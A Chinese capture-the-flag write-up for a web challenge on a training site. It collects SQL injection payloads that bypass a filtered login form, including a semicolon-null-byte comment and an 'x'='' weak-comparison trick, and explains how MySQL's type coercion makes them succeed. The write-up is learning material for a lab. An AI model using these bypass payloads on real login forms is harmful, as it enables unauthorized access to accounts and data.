# 题目

不要怀疑,我已经过滤了一切,还再逼你注入,哈哈哈哈哈!
flag格式：ctf{xxxx}

解题链接： [http://ctf5.shiyanbar.com/web/wonderkun/web/index.html](http://ctf5.shiyanbar.com/web/wonderkun/web/index.html)

# write up

看了各个 writeup，总共有 2 种答案

## 答案一

post 提交

```shell
username=a’+0;%00&password= 
```

核心思想是：一个字符串类型的，当他接受到一个整型值切值为 0 的时候，就会返回数据库的所有条目。一个字符串加一个整形，会自动的变量类型转换，变为一个整型。

核心思想2：mysql的注释符除了 `– + ， # ，/**/ ` 之外，还有一个 `;%00`

原理解释：http://blog.csdn.net/yalecaltech/article/details/63685280

## 答案二

```shell
username=	1’=’0
password=	1’=’0
# 或者
username=	what’=’
password=	what’=’
# 或者
username=	admin’=’
password=	admin’=’
```

核心思想：

```shell
这是有2个等号，然后计算顺序从左到右，
先计算username='pcat' 一般数据库里不可能有我这个小名（若有，你就换一个字符串），所以这里返回值为0（相当于false）
然后0='' 这个结果呢？看到这里估计你也懂了，就是返回1（相当于true）
```

原理解释：【登陆一下好吗?? by pcat】

```shell
这题我看到的时间比较晚，评论区有人说过滤了/ # -- select or union |等
反正不管，我先按常规试试
username=admin'--&password='or''='
回显：
对不起，没有此用户！！
hint：
username:admin'
password:'''='

这时候--和or被过滤看起来好可怕，但是单引号'没被过滤就是最幸福的事儿了（虽然有可能是经过转义的，但题目中说只是过滤，没说转义，( # ▽ # )）
这时候其实只要帐号和密码都上万能密码，啥都搞定，看似被过滤了n多n多，但却是最容易注入进去的。

来一个过法:)
username=pcat'='&password=pcat'='

flag立马就拿到，为何能过呢？很多人就疑问了？没有or也能万能注入？
解析过程看下面
- - - - - - - - - - - -
假设sql语句如下
select * from user where username='用户名' and password='密码'

当提交username=pcat'='&password=pcat'='
语句会变成如下：
select * from user where username='pcat'='' and password='pcat'=''
这时候还不够清晰，我提取前一段判断出来（后面的同样道理）
username='pcat'=''
这是有2个等号，然后计算顺序从左到右，
先计算username='pcat' 一般数据库里不可能有我这个小名（若有，你就换一个字符串），所以这里返回值为0（相当于false）
然后0='' 这个结果呢？看到这里估计你也懂了，就是返回1（相当于true）

所以这样的注入相当于
select * from user where 1 and 1
也等于 select * from user
（这题只有筛选出来的结果有3个以上才会显示flag，没有就一直说“对不起，没有此用户！！”）

好了，继续唠叨几句，上面那个比较是弱类型的比较，
以下情况都会为true
1='1'
1='1.0'
1='1后接字母(再后面有数字也可以)'
0='除了非0数字开头的字符串'
（总体上只要前面达成0的话，要使语句为true很简单，所以这题的万能密码只要按照我上面的法子去写一大把）
```

